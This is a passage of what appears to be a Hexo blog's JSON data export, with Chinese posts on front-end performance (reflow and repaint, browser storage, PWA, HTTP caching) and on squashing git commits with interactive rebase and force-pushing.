id=\"SessionStorage\"><a href=\"#SessionStorage\" class=\"headerlink\" title=\"SessionStorage\"></a>SessionStorage</h2><ul><li>会话级别的浏览器存储</li><li>大小为5M左右</li><li>仅在客户端使用，不和服务器端通信</li><li>接口封装较好</li><li>对于表单信息的维护</li></ul><h2 id=\"indexDB\"><a href=\"#indexDB\" class=\"headerlink\" title=\"indexDB\"></a>indexDB</h2><ul><li>IndexedDB 是一种低级API，用于客户端存储大量结构化数据(包括, 文件/ blobs)。该API使用索引来实现对该数据的高性能搜索。虽然 Web Storage 对于存储较少量的数据很有用，但对于存储更大量的结构化数据来说，这种方法不太有用。IndexedDB提供了一个解决方案。</li><li>为应用创建离线版本</li></ul><h2 id=\"PWA\"><a href=\"#PWA\" class=\"headerlink\" title=\"PWA\"></a>PWA</h2><p>Progressive Web App, 简称 PWA，是提升 Web App 的体验的一种新方法，能给用户原生应用的体验。</p><p>PWA 能做到原生应用的体验不是靠特指某一项技术，而是经过应用一些新技术进行改进，在安全、性能和体验三个方面都有很大提升，PWA 本质上是 Web App，借助一些新技术也具备了 Native App 的一些特性，兼具 Web App 和 Native App 的优点。</p><p>PWA 的主要特点包括下面三点：</p><p>可靠 - 即使在不稳定的网络环境下，也能瞬间加载并展现<br>体验 - 快速响应，并且有平滑的动画响应用户的操作<br>粘性 - 像设备上的原生应用，具有沉浸式的用户体验，用户可以添加到桌面<br>PWA 本身强调渐进式，并不要求一次性达到安全、性能和体验上的所有要求，开发者可以通过 PWA Checklist 查看现有的特征。</p><h2 id=\"Service-Worker\"><a href=\"#Service-Worker\" class=\"headerlink\" title=\"Service Worker\"></a>Service Worker</h2><p>1、使用拦截和处理网络请求能力，实现离线应用<br>2、使用Service Worker在后台运行同时和页面通信的能力，趋势线大规模后台数据处理</p><h2 id=\"缓存\"><a href=\"#缓存\" class=\"headerlink\" title=\"缓存\"></a>缓存</h2><h3 id=\"httpheader\"><a href=\"#httpheader\" class=\"headerlink\" title=\"httpheader\"></a>httpheader</h3><h4 id=\"Cache-Control\"><a href=\"#Cache-Control\" class=\"headerlink\" title=\"Cache-Control\"></a>Cache-Control</h4><ul><li>max-age=”seconds”<br>设置缓存存储的最大周期，超过这个时间缓存被认为过期(单位秒)。与Expires相反，时间是相对于请求的时间。</li><li>s-maxage=”seconds”<br>覆盖max-age 或者 Expires 头，但是仅适用于共享缓存(比如各个代理)，并且私有缓存中它被忽略。</li><li>public<br>表明响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存。</li><li>private<br>表明响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）,可以缓存响应内容。</li><li>no-cache<br>在发布缓存副本之前，强制高速缓存将请求提交给原始服务器进行验证。</li><li>no-store<br>缓存不应存储有关客户端请求或服务器响应的任何内容。<h4 id=\"Expires\"><a href=\"#Expires\" class=\"headerlink\" title=\"Expires\"></a>Expires</h4></li><li>缓存过期时间，用来指定资源到期时间，是服务器端的具体的时间点</li><li>告诉浏览器在过期时间前浏览器可以直接从浏览器缓存去数据，无需再次请求<h4 id=\"Last-Modified-If-Modified-Since\"><a href=\"#Last-Modified-If-Modified-Since\" class=\"headerlink\" title=\"Last-Modified/If-Modified-Since\"></a>Last-Modified/If-Modified-Since</h4><h5 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h5>The Last-Modified 是一个响应首部，其中包含源头服务器认定的资源做出修改的日期及时间。 它通常被用作一个验证器来判断接收到的或者存储的资源是否彼此一致<br>1、请求浏览器，给到缓存文件，response带有last-modified 给到浏览器存储为last-modified-since<br>2、浏览器再次请求文件，带有last-modiied-since, 服务器对比last-modified，若过期则给到新的文件，若不过期，则继续使用本地文件<h5 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h5>1、某些服务器不能获取精确的修改时间<br>2、文件修改时间改了，但文件内容却没有改变<h4 id=\"Etag-If-None-Match\"><a href=\"#Etag-If-None-Match\" class=\"headerlink\" title=\"Etag/If-None-Match\"></a>Etag/If-None-Match</h4></li><li>文件内容的hash值</li><li>etag——response header</li><li>if-none-match —— request header</li><li>需要和cache-control一起使用<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> ---------------------    </span><br><span class=\"line\">\t\t\t\t\t   当浏览器本地没有缓存或者下一层失效时，或者用户点击刷新</span><br><span class=\"line\">\\       200状态        /   浏览器直接去服务器下载最新数据</span><br><span class=\"line\"></span><br><span class=\"line\">  -------------------     </span><br><span class=\"line\">\t\t\t\t\t   这一层由 last-modified / Etag 控制,当下一层失效时，</span><br><span class=\"line\">  \\     304状态       /    或用户点击刷新，浏览器就会发送请求给服务器，如果文件无变</span><br><span class=\"line\">\t\t\t\t\t   化则返回304</span><br><span class=\"line\">    ----------------      </span><br><span class=\"line\">\t\t\t\t       这层由expires/cache-control控制，expires(http 1.0     </span><br><span class=\"line\">    \\ 200(from disk) /    有效)是绝对时间，cache-control(http1.1版有效)相对</span><br><span class=\"line\">\t\t\t\t\t   时间，两者都存在，cache-control覆盖expires，没有失效</span><br><span class=\"line\">      --------------      则直接访问自己缓存</span><br></pre></td></tr></table></figure></li></ul><p><img src=\"/img/loading.gif\" data-original=\"/前端/font-end-optimize/font-end-cache.png\" alt=\"Alt text\"></p><h2 id=\"服务端性能优化\"><a href=\"#服务端性能优化\" class=\"headerlink\" title=\"服务端性能优化\"></a>服务端性能优化</h2><h3 id=\"多层次优化方案\"><a href=\"#多层次优化方案\" class=\"headerlink\" title=\"多层次优化方案\"></a>多层次优化方案</h3><ul><li>构建层模版编译</li><li>数据无关prerender方式</li><li>服务端渲染</li></ul>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"资源合并与压缩-http请求的过程及潜在的性能优化\"><a href=\"#资源合并与压缩-http请求的过程及潜在的性能优化\" class=\"headerlink\" title=\"资源合并与压缩-http请求的过程及潜在的性能优化\"></a>资源合并与压缩-http请求的过程及潜在的性能优化</h3><p>浏览器的一个请求从发送到返回都经历了什么</p><p><img src=\"/前端/font-end-optimize/page-process.png\" alt=\"http\"></p><p>思考</p><ul><li>dns是否可以通过缓存减少dns查询时间？</li><li>网络请求的过程走最近的网络环境？</li><li>相同的静态资源是否可以缓存？</li><li>能否减少请求http请求大小？</li><li>减少http请求</li><li>服务端渲染<h2 id=\"重绘和回流\"><a href=\"#重绘和回流\" class=\"headerlink\" title=\"重绘和回流\"></a>重绘和回流</h2><h3 id=\"css会让JavaScript变慢吗\"><a href=\"#css会让JavaScript变慢吗\" class=\"headerlink\" title=\"css会让JavaScript变慢吗\"></a>css会让JavaScript变慢吗</h3>一个线程执行JavaScript<br>一个线程执行渲染<br>频繁触发重绘和回流，导致UI渲染频繁，最重导致js变慢<h3 id=\"啥是重绘和回流\"><a href=\"#啥是重绘和回流\" class=\"headerlink\" title=\"啥是重绘和回流\"></a>啥是重绘和回流</h3><h4 id=\"回流\"><a href=\"#回流\" class=\"headerlink\" title=\"回流\"></a>回流</h4></li><li>当render tree中的一部分或全部因为元素规模尺寸，布局，隐藏等改变需要重新构建，称作为回流（reflow）</li><li>当页面布局和几何属性变化时，就需要回流<h4 id=\"重绘\"><a href=\"#重绘\" class=\"headerlink\" title=\"重绘\"></a>重绘</h4>当render tree中的一些元素需要更新属性，而这些属性只是影响元素外观，风格，而不会影响布局的，比如background-color，则称之为重绘</li></ul><p>回流一定会重绘，重绘不一定会回流</p><h3 id=\"触发页面重布局的属性\"><a href=\"#触发页面重布局的属性\" class=\"headerlink\" title=\"触发页面重布局的属性\"></a>触发页面重布局的属性</h3><ul><li>盒子模型相关属性会触发重布局</li><li>定位属性及浮动会触发页面重布局</li><li>改变节点内部文字结构会触发重布局<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">width\t\t\ttop\t\t\ttext-align</span><br><span class=\"line\">height\t\t\tbottom\t\toverflow-y</span><br><span class=\"line\">padding\t\t\tleft\t\tfont-weight</span><br><span class=\"line\">margin\t\t\tright\t\toverflow</span><br><span class=\"line\">display\t\t\tposition\tfont-family</span><br><span class=\"line\">border-width\tfloat\t\tline-height</span><br><span class=\"line\">border\t\t\tclear\t\tvertical-align</span><br><span class=\"line\">min-height\t\t\t\t\twhite-space</span><br><span class=\"line\">\t\t\t\t\t\t\tfont-size</span><br></pre></td></tr></table></figure></li></ul><h3 id=\"触发页面重绘的属性\"><a href=\"#触发页面重绘的属性\" class=\"headerlink\" title=\"触发页面重绘的属性\"></a>触发页面重绘的属性</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">color\t\t\t\tborder-style</span><br><span class=\"line\">border-radius\t\tvisibility</span><br><span class=\"line\">text-decoration\t\tbackground</span><br><span class=\"line\">background-image\tbackground-position</span><br><span class=\"line\">background-repeat\tbackground-size</span><br><span class=\"line\">outline-color\t\toutline</span><br><span class=\"line\">outline-style\t\toutline-width</span><br><span class=\"line\">box-shadow</span><br></pre></td></tr></table></figure><h3 id=\"新建DOM过程\"><a href=\"#新建DOM过程\" class=\"headerlink\" title=\"新建DOM过程\"></a>新建DOM过程</h3><p>1、 获取DOM后分割为多个图层<br>2、 对每个图层的阶段计算样式结果(recalulate style — 样式重计算)<br>3、 为每个节点生成图形和位置(Layout— 回流和重布局)<br>4、 将每个节点绘制填充到图层位置中(Paint setup 和Paint — 重绘)<br>5、 图层作为纹理上传至gpu<br>6、 符合多个图层到页面上生成最终屏幕图像(composite layers — 图层重组)</p><h3 id=\"减少重绘和回流\"><a href=\"#减少重绘和回流\" class=\"headerlink\" title=\"减少重绘和回流\"></a>减少重绘和回流</h3><p>避免重绘回流的css<br>将频繁重绘和回流的dom元素单独作为独立图层，那么这个dom元素只会影响这个独立图层</p><h3 id=\"如何将DOM创建一个新的图层\"><a href=\"#如何将DOM创建一个新的图层\" class=\"headerlink\" title=\"如何将DOM创建一个新的图层\"></a>如何将DOM创建一个新的图层</h3><p>1、3D或者透视变化CSS属性(perspective transform)<br>2、 使用加速视屏解码的 video 节点<br>3、拥有3D(webGL)上下文或加速的2D上下文的 canvas 节点<br>4、混合插件(如flash)<br>5、对自己的opacity做css动画或使用一个动画webkit变换的元素<br>6、使用加速CSS过滤器的元素(translate3D..)<br>7、元素有一个包含复合层的后代节点(一个元素拥有一个子元素，该元素在自己的层里)<br>8、元素有一个z-index较低且包含一个符合层的兄弟元素(该元渲染在符合层上面渲染)</p><h3 id=\"避免重绘回流\"><a href=\"#避免重绘回流\" class=\"headerlink\" title=\"避免重绘回流\"></a>避免重绘回流</h3><p>1、用translate替代top：top会触发回流而translate不会<br>2、用opacity替代visibility：visibility会触发重绘而opacity不会<br>3、不要一条条修改DOM修改样式，可以放在一个class内，替换class<br>4、离线修改，使用display-none修改元素再显示<br>5、不要把DOM节点属性值放在一个循环里的变量里（offsetHight， offsetWidth）<br>6、不使用table布局，可能很小的修改导致整个table重新布局<br>7、动画实现的速度的选择<br>8、对于动画新建图层 (git图加上will-change, transform)<br>9、使用GPU硬件加速(trasform: translateZ, trasform: transform3d(0,0,0))</p><h2 id=\"localStorage\"><a href=\"#localStorage\" class=\"headerlink\" title=\"localStorage\"></a>localStorage</h2><ul><li>HTML5设计出来专门用于浏览器存储的</li><li>大小为5M左右</li><li>尽在客户端使用，不和服务端通信</li><li>接口封装比较好</li><li>浏览器本地缓存方案</li></ul><h2 id=\"SessionStorage\"><a href=\"#SessionStorage\" class=\"headerlink\" title=\"SessionStorage\"></a>SessionStorage</h2><ul><li>会话级别的浏览器存储</li><li>大小为5M左右</li><li>仅在客户端使用，不和服务器端通信</li><li>接口封装较好</li><li>对于表单信息的维护</li></ul><h2 id=\"indexDB\"><a href=\"#indexDB\" class=\"headerlink\" title=\"indexDB\"></a>indexDB</h2><ul><li>IndexedDB 是一种低级API，用于客户端存储大量结构化数据(包括, 文件/ blobs)。该API使用索引来实现对该数据的高性能搜索。虽然 Web Storage 对于存储较少量的数据很有用，但对于存储更大量的结构化数据来说，这种方法不太有用。IndexedDB提供了一个解决方案。</li><li>为应用创建离线版本</li></ul><h2 id=\"PWA\"><a href=\"#PWA\" class=\"headerlink\" title=\"PWA\"></a>PWA</h2><p>Progressive Web App, 简称 PWA，是提升 Web App 的体验的一种新方法，能给用户原生应用的体验。</p><p>PWA 能做到原生应用的体验不是靠特指某一项技术，而是经过应用一些新技术进行改进，在安全、性能和体验三个方面都有很大提升，PWA 本质上是 Web App，借助一些新技术也具备了 Native App 的一些特性，兼具 Web App 和 Native App 的优点。</p><p>PWA 的主要特点包括下面三点：</p><p>可靠 - 即使在不稳定的网络环境下，也能瞬间加载并展现<br>体验 - 快速响应，并且有平滑的动画响应用户的操作<br>粘性 - 像设备上的原生应用，具有沉浸式的用户体验，用户可以添加到桌面<br>PWA 本身强调渐进式，并不要求一次性达到安全、性能和体验上的所有要求，开发者可以通过 PWA Checklist 查看现有的特征。</p><h2 id=\"Service-Worker\"><a href=\"#Service-Worker\" class=\"headerlink\" title=\"Service Worker\"></a>Service Worker</h2><p>1、使用拦截和处理网络请求能力，实现离线应用<br>2、使用Service Worker在后台运行同时和页面通信的能力，趋势线大规模后台数据处理</p><h2 id=\"缓存\"><a href=\"#缓存\" class=\"headerlink\" title=\"缓存\"></a>缓存</h2><h3 id=\"httpheader\"><a href=\"#httpheader\" class=\"headerlink\" title=\"httpheader\"></a>httpheader</h3><h4 id=\"Cache-Control\"><a href=\"#Cache-Control\" class=\"headerlink\" title=\"Cache-Control\"></a>Cache-Control</h4><ul><li>max-age=”seconds”<br>设置缓存存储的最大周期，超过这个时间缓存被认为过期(单位秒)。与Expires相反，时间是相对于请求的时间。</li><li>s-maxage=”seconds”<br>覆盖max-age 或者 Expires 头，但是仅适用于共享缓存(比如各个代理)，并且私有缓存中它被忽略。</li><li>public<br>表明响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存。</li><li>private<br>表明响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）,可以缓存响应内容。</li><li>no-cache<br>在发布缓存副本之前，强制高速缓存将请求提交给原始服务器进行验证。</li><li>no-store<br>缓存不应存储有关客户端请求或服务器响应的任何内容。<h4 id=\"Expires\"><a href=\"#Expires\" class=\"headerlink\" title=\"Expires\"></a>Expires</h4></li><li>缓存过期时间，用来指定资源到期时间，是服务器端的具体的时间点</li><li>告诉浏览器在过期时间前浏览器可以直接从浏览器缓存去数据，无需再次请求<h4 id=\"Last-Modified-If-Modified-Since\"><a href=\"#Last-Modified-If-Modified-Since\" class=\"headerlink\" title=\"Last-Modified/If-Modified-Since\"></a>Last-Modified/If-Modified-Since</h4><h5 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h5>The Last-Modified 是一个响应首部，其中包含源头服务器认定的资源做出修改的日期及时间。 它通常被用作一个验证器来判断接收到的或者存储的资源是否彼此一致<br>1、请求浏览器，给到缓存文件，response带有last-modified 给到浏览器存储为last-modified-since<br>2、浏览器再次请求文件，带有last-modiied-since, 服务器对比last-modified，若过期则给到新的文件，若不过期，则继续使用本地文件<h5 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h5>1、某些服务器不能获取精确的修改时间<br>2、文件修改时间改了，但文件内容却没有改变<h4 id=\"Etag-If-None-Match\"><a href=\"#Etag-If-None-Match\" class=\"headerlink\" title=\"Etag/If-None-Match\"></a>Etag/If-None-Match</h4></li><li>文件内容的hash值</li><li>etag——response header</li><li>if-none-match —— request header</li><li>需要和cache-control一起使用<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> ---------------------    </span><br><span class=\"line\">\t\t\t\t\t   当浏览器本地没有缓存或者下一层失效时，或者用户点击刷新</span><br><span class=\"line\">\\       200状态        /   浏览器直接去服务器下载最新数据</span><br><span class=\"line\"></span><br><span class=\"line\">  -------------------     </span><br><span class=\"line\">\t\t\t\t\t   这一层由 last-modified / Etag 控制,当下一层失效时，</span><br><span class=\"line\">  \\     304状态       /    或用户点击刷新，浏览器就会发送请求给服务器，如果文件无变</span><br><span class=\"line\">\t\t\t\t\t   化则返回304</span><br><span class=\"line\">    ----------------      </span><br><span class=\"line\">\t\t\t\t       这层由expires/cache-control控制，expires(http 1.0     </span><br><span class=\"line\">    \\ 200(from disk) /    有效)是绝对时间，cache-control(http1.1版有效)相对</span><br><span class=\"line\">\t\t\t\t\t   时间，两者都存在，cache-control覆盖expires，没有失效</span><br><span class=\"line\">      --------------      则直接访问自己缓存</span><br></pre></td></tr></table></figure></li></ul><p><img src=\"/前端/font-end-optimize/font-end-cache.png\" alt=\"Alt text\"></p><h2 id=\"服务端性能优化\"><a href=\"#服务端性能优化\" class=\"headerlink\" title=\"服务端性能优化\"></a>服务端性能优化</h2><h3 id=\"多层次优化方案\"><a href=\"#多层次优化方案\" class=\"headerlink\" title=\"多层次优化方案\"></a>多层次优化方案</h3><ul><li>构建层模版编译</li><li>数据无关prerender方式</li><li>服务端渲染</li></ul>"},{"title":"git —— 通过 rebase 合并 commit","date":"2021-10-08T04:41:58.000Z","dir":"git","keywords":["合并commit","git rebase 合并 commit"],"_content":"## 背景\n在项目开发时候，经常会遇到明明是同一个修改，在一些不可抗拒因素下，导致本应该是一次提交的 commit 被多次提交。在开源社区往往对commit message 有着强迫症似的提交。\n\n本篇的目的就是通过 rebase 合并 commit。\n\n## 场景再现\n分支: `master`\n提交次数: `2次`\ngit log:\n- 初始化: 第二次提交 (**当前最新commit**)\n- 初始化: 第一次提交(需要合并)\n- 初始化: init（不需要合并）\n\n![git-log](git-log.png)\n\n### 期望场景\n合并commit: `e4a5545b` 和 `1bc8133d` \ngit log: `初始化文件`\n\n## 操作步骤\n### 压缩 commit 命令\n命令：`git rebase -i [start point] [end point]` or `git rebase -i HEAD~[number]` 可使用任意一种\n\n```bash\ngit rebase -i 03dcc16f // commit号是需要合并提交的前一次提交\n// or \ngit rebase -i 03dcc16f 1bc8133d\n// or\ngit rebase -i HEAD~2\n```\n\n键入命令后，commit 信息由最开始到最近提交。即：最上面是最开始的提交，最下面是最近提交。\n![git-rebase-pick](git-rebase-pick.png)\n\n### Rebase\n#### 1. 命令解析：\n- `pick`: 要执行这个 commit\n- `squash` : 当前 commit 会被合并到前一个 commit\n- ...\n\n#### 2. 操作 rebase -i\n- 将 `除了第一条` 的 `pick` 都改为 `squash` 或者 `s`\n- vi `:wq` 保存退出\n\n\n![git-rebase-s](git-rebase-s.png)\n\n#### 3. git rebase 基础操作(非必要无需此步)\ngit 会压缩提交历史，若有冲突，需要进行修改，修改的时候保留最新的历史记录。\n- if 执行压缩：\n```\ngit add .\ngit rebase --continue\n```\n\n- else 如果放弃此次压缩：\n```\ngit rebase --abort\n```\n\n#### 4. 修改 commit message\n\n若无冲突 or 冲突已 fix，则会出现一个 commit message 编辑页面。\n\n修改 commit message， vi `:wq` 保存退出。\n\n![modify-commit-message](modify-commit-message.png)\n\n#### 5. 查看修改后的内容\n```bash\ngit log\n```\n![modified-git-log](modified-git-log.png)\n\n已经将 `e4a5545b` 和 `1bc8133d` 合并成一条 `510bfd34`  ✅\n\n#### 6. 同步到远端\n使用 `git push -f` or `git push --force` 强制推送。\n\n由于本地 git commit 记录被改动，与远端的记录不匹配。因此需要用 `force push` 强制远端与本地记录同步。\n\n```bash\ngit push -f\n// or\ngit push --force\n```\n\n再看远端的仓库，记录已经改变～\n","source":"_posts/git-rebase-merge-commit.md","raw":"---\ntitle: git —— 通过 rebase 合并 commit\ndate: 2021-10-08 12:41:58\ntags: git\ndir: git\nkeywords:\n    - 合并commit\n    - git rebase 合并 commit\n---\n## 背景\n在项目开发时候，经常会遇到明明是同一个修改，在一些不可抗拒因素下，导致本应该是一次提交的 commit 被多次提交。在开源社区往往对commit message 有着强迫症似的提交。\n\n本篇的目的就是通过 rebase 合并 commit。\n\n## 场景再现\n分支: `master`\n提交次数: `2次`\ngit log:\n- 初始化: 第二次提交 (**当前最新commit**)\n- 初始化: 第一次提交(需要合并)\n- 初始化: init（不需要合并）\n\n![git-log](git-log.png)\n\n### 期望场景\n合并commit: `e4a5545b` 和 `1bc8133d` \ngit log: `初始化文件`\n\n## 操作步骤\n### 压缩 commit 命令\n命令：`git rebase -i [start point] [end point]` or `git rebase -i HEAD~[number]` 可使用任意一种\n\n```bash\ngit rebase -i 03dcc16f // commit号是需要合并提交的前一次提交\n// or \ngit rebase -i 03dcc16f 1bc8133d\n// or\ngit rebase -i HEAD~2\n```\n\n键入命令后，commit 信息由最开始到最近提交。即：最上面是最开始的提交，最下面是最近提交。\n![git-rebase-pick](git-rebase-pick.png)\n\n### Rebase\n#### 1. 命令解析：\n- `pick`: 要执行这个 commit\n- `squash` : 当前 commit 会被合并到前一个 commit\n- ...\n\n#### 2. 操作 rebase -i\n- 将 `除了第一条` 的 `pick` 都改为 `squash` 或者 `s`\n- vi `:wq` 保存退出\n\n\n![git-rebase-s](git-rebase-s.png)\n\n#### 3. git rebase 基础操作(非必要无需此步)\ngit 会压缩提交历史，若有冲突，需要进行修改，修改的时候保留最新的历史记录。\n- if 执行压缩：\n```\ngit add .\ngit rebase --continue\n```\n\n- else 如果放弃此次压缩：\n```\ngit rebase --abort\n```\n\n#### 4. 修改 commit message\n\n若无冲突 or 冲突已 fix，则会出现一个 commit message 编辑页面。\n\n修改 commit message， vi `:wq` 保存退出。\n\n![modify-commit-message](modify-commit-message.png)\n\n#### 5. 查看修改后的内容\n```bash\ngit log\n```\n![modified-git-log](modified-git-log.png)\n\n已经将 `e4a5545b` 和 `1bc8133d` 合并成一条 `510bfd34`  ✅\n\n#### 6. 同步到远端\n使用 `git push -f` or `git push --force` 强制推送。\n\n由于本地 git commit 记录被改动，与远端的记录不匹配。因此需要用 `force push` 强制远端与本地记录同步。\n\n```bash\ngit push -f\n// or\ngit push --force\n```\n\n再看远端的仓库，记录已经改变～\n","slug":"git-rebase-merge-commit","published":1,"updated":"2021-10-13T15:52:24.451Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz04000n4jzxorx5aqgi","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>在项目开发时候，经常会遇到明明是同一个修改，在一些不可抗拒因素下，导致本应该是一次提交的 commit 被多次提交。在开源社区往往对commit message 有着强迫症似的提交。</p><p>本篇的目的就是通过 rebase 合并 commit。</p><h2 id=\"场景再现\"><a href=\"#场景再现\" class=\"headerlink\" title=\"场景再现\"></a>场景再现</h2><p>分支: <code>master</code><br>提交次数: <code>2次</code><br>git log:</p><ul><li>初始化: 第二次提交 (<strong>当前最新commit</strong>)</li><li>初始化: 第一次提交(需要合并)</li><li>初始化: init（不需要合并）</li></ul><p><img src=\"/img/loading.gif\" data-original=\"/git/git-rebase-merge-commit/git-log.png\" alt=\"git-log\"></p><h3 id=\"期望场景\"><a href=\"#期望场景\" class=\"headerlink\" title=\"期望场景\"></a>期望场景</h3><p>合并commit: <code>e4a5545b</code> 和 <code>1bc8133d</code><br>git log: <code>初始化文件</code></p><h2 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h2><h3 id=\"压缩-commit-命令\"><a href=\"#压缩-commit-命令\" class=\"headerlink\" title=\"压缩 commit 命令\"></a>压缩 commit 命令</h3><p>命令：<code>git rebase -i [start point] [end point]</code> or <code>git rebase -i HEAD~[number]</code> 可使用任意一种</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git rebase -i 03dcc16f // commit号是需要合并提交的前一次提交</span><br><span class=\"line\">// or </span><br><span class=\"line\">git rebase -i 03dcc16f 1bc8133d</span><br><span class=\"line\">// or</span><br><span class=\"line\">git rebase -i HEAD~2</span><br></pre></td></tr></table></figure><p>键入命令后，commit 信息由最开始到最近提交。即：最上面是最开始的提交，最下面是最近提交。<br><img src=\"/img/loading.gif\" data-original=\"/git/git-rebase-merge-commit/git-rebase-pick.png\" alt=\"git-rebase-pick\"></p><h3 id=\"Rebase\"><a href=\"#Rebase\" class=\"headerlink\" title=\"Rebase\"></a>Rebase</h3><h4 id=\"1-命令解析：\"><a href=\"#1-命令解析：\" class=\"headerlink\" title=\"1. 命令解析：\"></a>1. 命令解析：</h4><ul><li><code>pick</code>: 要执行这个 commit</li><li><code>squash</code> : 当前 commit 会被合并到前一个 commit</li><li>…</li></ul><h4 id=\"2-操作-rebase-i\"><a href=\"#2-操作-rebase-i\" class=\"headerlink\" title=\"2. 操作 rebase -i\"></a>2. 操作 rebase -i</h4><ul><li>将 <code>除了第一条</code> 的 <code>pick</code> 都改为 <code>squash</code> 或者 <code>s</code></li><li>vi <code>:wq</code> 保存退出</li></ul><p><img src=\"/img/loading.gif\" data-original=\"/git/git-rebase-merge-commit/git-rebase-s.png\" alt=\"git-rebase-s\"></p><h4 id=\"3-git-rebase-基础操作-非必要无需此步\"><a href=\"#3-git-rebase-基础操作-非必要无需此步\" class=\"headerlink\" title=\"3. git rebase 基础操作(非必要无需此步)\"></a>3. git rebase 基础操作(非必要无需此步)</h4><p>git 会压缩提交历史，若有冲突，需要进行修改，修改的时候保留最新的历史记录。</p><ul><li><p>if 执行压缩：</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add .</span><br><span class=\"line\">git rebase --continue</span><br></pre></td></tr></table></figure></li><li><p>else 如果放弃此次压缩：</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git rebase --abort</span><br></pre></td></tr></table></figure></li></ul><h4 id=\"4-修改-commit-message\"><a href=\"#4-修改-commit-message\" class=\"headerlink\" title=\"4. 修改 commit message\"></a>4. 修改 commit message</h4><p>若无冲突 or 冲突已 fix，则会出现一个 commit message 编辑页面。</p><p>修改 commit message， vi <code>:wq</code> 保存退出。</p><p><img src=\"/img/loading.gif\" data-original=\"/git/git-rebase-merge-commit/modify-commit-message.png\" alt=\"modify-commit-message\"></p><h4 id=\"5-查看修改后的内容\"><a href=\"#5-查看修改后的内容\" class=\"headerlink\" title=\"5. 查看修改后的内容\"></a>5. 查看修改后的内容</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure><p><img src=\"/img/loading.gif\" data-original=\"/git/git-rebase-merge-commit/modified-git-log.png\" alt=\"modified-git-log\"></p><p>已经将 <code>e4a5545b</code> 和 <code>1bc8133d</code> 合并成一条 <code>510bfd34</code> ✅</p><h4 id=\"6-同步到远端\"><a href=\"#6-同步到远端\" class=\"headerlink\" title=\"6. 同步到远端\"></a>6. 同步到远端</h4><p>使用 <code>git push -f</code> or <code>git push --force</code> 强制推送。</p><p>由于本地 git commit 记录被改动，与远端的记录不匹配。因此需要用 <code>force push</code> 强制远端与本地记录同步。</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push -f</span><br><span class=\"line\">// or</span><br><span class=\"line\">git push --force</span><br></pre></td></tr></table></figure><p>再看远端的仓库，记录已经改变～</p>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>在项目开发时候，经常会遇到明明是同一个修改，在一些不可抗拒因素下，导致本应该是一次提交的 commit 被多次提交。在开源社区往往对commit message 有着强迫症似的提交。</p><p>本篇的目的就是通过 rebase 合并 commit。</p><h2 id=\"场景再现\"><a href=\"#场景再现\" class=\"headerlink\" title=\"场景再现\"></a>场景再现</h2><p>分支: <code>master</code><br>提交次数: <code>2次</code><br>git log:</p><ul><li>初始化: 第二次提交 (<strong>当前最新commit</strong>)</li><li>初始化: 第一次提交(需要合并)</li><li>初始化: init（不需要合并）</li></ul><p><img src=\"/git/git-rebase-merge-commit/git-log.png\" alt=\"git-log\"></p><h3 id=\"期望场景\"><a 